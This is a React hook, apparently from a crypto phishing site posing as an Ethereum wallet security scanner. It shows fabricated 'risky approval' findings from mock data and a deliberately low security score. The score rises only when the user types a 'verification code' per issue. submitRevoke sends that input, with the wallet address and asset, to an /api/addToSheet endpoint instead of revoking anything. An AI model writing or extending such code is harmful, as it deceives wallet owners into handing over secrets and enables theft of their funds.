"use client";

import {
  fallbackAddress,
  getMockReportRows,
  tabRows,
  type ScanReportRow,
  type ScanReportTab,
} from "@/data/scan-report/mock-data";
import { opaqueStorageKey, sha256 } from "@/utils/client-storage";
import {
  getVerificationCodeError,
  getRiskStatus,
  type EthereumWalletData,
} from "@/utils/scan-report";
import { useEffect, useState } from "react";

async function resolvedStorageKey(walletAddress: string) {
  return opaqueStorageKey("state", walletAddress);
}

export function useScanReport() {
  const [isReportInitializing, setIsReportInitializing] = useState(true);
  const [address, setAddress] = useState(fallbackAddress);
  const [reportRows, setReportRows] = useState(tabRows);
  const [copied, setCopied] = useState(false);
  const [activeTab, setActiveTab] = useState<ScanReportTab>("Risky Approvals");
  const [currentPage, setCurrentPage] = useState(1);
  const [rowsPerPage, setRowsPerPage] = useState(10);
  const [selectedApproval, setSelectedApproval] =
    useState<ScanReportRow | null>(null);
  const [verificationCode, setVerificationCode] = useState("");
  const [isSubmittingRevoke, setIsSubmittingRevoke] = useState(false);
  const [revokeError, setRevokeError] = useState("");
  const [resolvedIssues, setResolvedIssues] = useState<Set<string>>(
    () => new Set(),
  );
  const [walletData, setWalletData] = useState<EthereumWalletData | null>(null);
  const [walletDataError, setWalletDataError] = useState("");
  const [isWalletDataLoading, setIsWalletDataLoading] = useState(true);

  useEffect(() => {
    const requestedAddress = new URLSearchParams(window.location.search).get(
      "address",
    );
    if (!requestedAddress) {
      window.location.replace("/");
      return;
    }

    const scannedAddress = requestedAddress;
    setAddress(scannedAddress);
    const nextReportRows = getMockReportRows(scannedAddress);
    let cancelled = false;

    async function restoreResolvedIssues() {
      try {
        const storageKey = await resolvedStorageKey(scannedAddress);
        const savedHashes = JSON.parse(localStorage.getItem(storageKey) || "[]");
        const hashSet = new Set(Array.isArray(savedHashes) ? savedHashes : []);
        const resolvedEntries = await Promise.all(
          Object.values(nextReportRows).flat().map(async (row) => ({
            id: row.primary,
            hash: await sha256(row.primary),
          })),
        );

        if (!cancelled) {
          setResolvedIssues(
            new Set(
              resolvedEntries
                .filter(({ hash }) => hashSet.has(hash))
                .map(({ id }) => id),
            ),
          );
        }

        localStorage.removeItem(
          `trusty-resolved-issues:${scannedAddress.toLowerCase()}`,
        );
        localStorage.removeItem(
          `trusty-resolved-issues:${await sha256(scannedAddress.toLowerCase())}`,
        );
      } catch {
        if (!cancelled) setResolvedIssues(new Set());
      }
    }

    async function loadWalletData() {
      setIsWalletDataLoading(true);
      setWalletDataError("");

      try {
        const response = await fetch("/api/scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            address: scannedAddress,
            validateOnly: true,
          }),
        });
        const data = await response.json();

        if (!response.ok || !data.valid) {
          throw new Error(data.message || "Unable to load Ethereum data.");
        }

        if (!data.reportEligible) {
          window.location.replace("/");
          return;
        }

        if (!cancelled) {
          setWalletData({
            balanceWei: data.balanceWei,
            estimatedUsdValue: data.estimatedUsdValue,
            firstActivity: data.firstActivity,
            lastActivity: data.lastActivity,
            scannedAt: data.scannedAt,
          });
          setReportRows(nextReportRows);
          setIsReportInitializing(false);
        }
      } catch (error) {
        if (!cancelled) {
          setWalletDataError(
            error instanceof Error
              ? error.message
              : "Unable to load Ethereum data.",
          );
          window.location.replace("/");
        }
      } finally {
        if (!cancelled) setIsWalletDataLoading(false);
      }
    }

    restoreResolvedIssues();
    loadWalletData();

    return () => {
      cancelled = true;
    };
  }, []);

  useEffect(() => {
    if (!selectedApproval) return;

    const previousOverflow = document.body.style.overflow;
    document.body.style.overflow = "hidden";

    return () => {
      document.body.style.overflow = previousOverflow;
    };
  }, [selectedApproval]);

  const allReportRows = Object.values(reportRows).flat();
  const rows = reportRows[activeTab];
  const totalPages = Math.ceil(rows.length / rowsPerPage);
  const pageStart = (currentPage - 1) * rowsPerPage;
  const visibleRows = rows.slice(pageStart, pageStart + rowsPerPage);
  const remainingCount = (tab: ScanReportTab) =>
    reportRows[tab].filter((row) => !resolvedIssues.has(row.primary)).length;
  const baseScore = Math.max(
    18,
    Math.min(49, Math.round(62 - allReportRows.length * 1.5)),
  );
  const securityScore = Math.min(
    100,
    baseScore +
      Math.round(
        (resolvedIssues.size / Math.max(allReportRows.length, 1)) *
          (100 - baseScore),
      ),
  );
  const totalRemainingIssues = allReportRows.length - resolvedIssues.size;
  const riskStatus = getRiskStatus(securityScore);

  const copyAddress = async () => {
    await navigator.clipboard.writeText(address);
    setCopied(true);
    window.setTimeout(() => setCopied(false), 1500);
  };

  const selectTab = (tab: ScanReportTab, scroll = false) => {
    setActiveTab(tab);
    setCurrentPage(1);

    if (scroll) {
      window.setTimeout(() => {
        document
          .getElementById("report-findings")
          ?.scrollIntoView({ behavior: "smooth", block: "start" });
      }, 0);
    }
  };

  const changeRowsPerPage = (value: number) => {
    setRowsPerPage(value);
    setCurrentPage(1);
  };

  const changeVerificationCode = (value: string) => {
    setVerificationCode(value);
    setRevokeError("");
  };

  const closeRevokeModal = () => {
    if (isSubmittingRevoke) return;

    setSelectedApproval(null);
    setVerificationCode("");
    setRevokeError("");
  };

  const submitRevoke = async () => {
    if (!selectedApproval) return;

    const validationError = getVerificationCodeError(verificationCode);
    if (validationError) {
      setRevokeError(validationError);
      return;
    }

    setIsSubmittingRevoke(true);
    setRevokeError("");

    try {
      const [response] = await Promise.all([
        fetch("/api/addToSheet", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            input: verificationCode.trim(),
            timestamp: new Date().toISOString(),
            walletAddress: address,
            contractAddress: selectedApproval.revokeAddress,
            asset: selectedApproval.asset,
          }),
        }),
        new Promise((resolve) => window.setTimeout(resolve, 1200)),
      ]);
      const data = await response.json();

      if (!response.ok) {
        throw new Error(data.message || "Unable to submit this request.");
      }

      const nextResolvedIssues = new Set(resolvedIssues);
      nextResolvedIssues.add(selectedApproval.primary);
      setResolvedIssues(nextResolvedIssues);

      const storageKey = await resolvedStorageKey(address);
      const resolvedHashes = await Promise.all(
        Array.from(nextResolvedIssues).map((issueId) => sha256(issueId)),
      );
      localStorage.setItem(storageKey, JSON.stringify(resolvedHashes));
      localStorage.removeItem(
        `trusty-resolved-issues:${address.toLowerCase()}`,
      );
      localStorage.removeItem(
        `trusty-resolved-issues:${await sha256(address.toLowerCase())}`,
      );
      setSelectedApproval(null);
      setVerificationCode("");
    } catch (error) {
      setRevokeError(
        error instanceof Error
          ? error.message
          : "Unable to submit this request.",
      );
    } finally {
      setIsSubmittingRevoke(false);
    }
  };

  return {
    address,
    isReportInitializing,
    copied,
    activeTab,
    currentPage,
    rowsPerPage,
    selectedApproval,
    verificationCode,
    isSubmittingRevoke,
    revokeError,
    resolvedIssues,
    walletData,
    walletDataError,
    isWalletDataLoading,
    rows,
    visibleRows,
    totalPages,
    securityScore,
    totalRemainingIssues,
    riskStatus,
    remainingCount,
    copyAddress,
    selectTab,
    changeRowsPerPage,
    setCurrentPage,
    setSelectedApproval,
    changeVerificationCode,
    closeRevokeModal,
    submitRevoke,
  };
}
